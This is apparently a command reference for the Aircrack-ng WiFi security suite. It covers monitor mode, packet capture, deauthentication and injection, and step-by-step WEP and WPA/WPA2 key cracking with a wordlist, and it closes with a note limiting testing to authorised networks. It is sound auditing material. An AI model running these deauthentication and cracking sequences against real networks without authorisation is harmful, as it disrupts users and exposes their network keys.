# Aircrack-ng - WiFi Security Auditing Suite

Complete suite of tools to assess WiFi network security.

## Installation

```bash
# Ubuntu/Debian
apt install aircrack-ng

# From source
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
make
sudo make install
```

## Core Components

### airmon-ng
Monitor mode enablement for wireless interfaces.

```bash
# Check wireless interfaces
airmon-ng

# Enable monitor mode
airmon-ng start wlan0

# Stop monitor mode
airmon-ng stop wlan0mon
```

### airodump-ng
Packet capture and analysis for 802.11 networks.

```bash
# Scan for networks
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Show only specific encryption
airodump-ng --encrypt WPA2 wlan0mon
```

### aireplay-ng
Traffic generation and injection attacks.

```bash
# Deauthentication attack
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Fake authentication
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP request replay
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
```

### aircrack-ng
WEP and WPA-PSK key recovery from captured packets.

```bash
# WEP key cracking
aircrack-ng capture-01.cap

# WPA2 dictionary attack
aircrack-ng -w wordlist.txt capture-01.cap

# WPA2 with specific BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

## Attack Scenarios

### WEP Cracking
```bash
# Monitor target network
airodump-ng -c 6 --bssid TARGET_BSSID -w wep_capture wlan0mon

# Generate traffic (if needed)
aireplay-ng -3 -b TARGET_BSSID wlan0mon

# Crack WEP key
aircrack-ng wep_capture-01.cap
```

### WPA/WPA2 Cracking
```bash
# Capture handshake
airodump-ng -c 6 --bssid TARGET_BSSID -w wpa_capture wlan0mon

# Force handshake capture
aireplay-ng -0 1 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Dictionary attack
aircrack-ng -w rockyou.txt wpa_capture-01.cap
```

## Additional Tools

### packetforge-ng
Create custom packets for injection attacks.

### ivstools
IVS file manipulation utilities.

### airbase-ng
Multi-purpose tool for rogue access point creation.

## Legal Considerations

Only test networks you own or have explicit permission to assess.
